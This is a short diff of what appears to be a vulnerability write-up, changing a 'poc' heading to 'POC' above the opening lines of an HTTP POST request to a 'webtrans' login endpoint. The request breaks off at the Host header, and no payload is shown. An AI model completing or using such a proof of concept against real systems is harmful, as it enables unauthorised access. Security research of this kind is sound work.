@@ -7,7 +7,7 @@
 "webtrans//js/md5-min.js"
 ```
 
-## poc
+## POC
 ```javascript
 POST /webtrans/index.php?controller=user&action=login HTTP/1.1
 Host: 
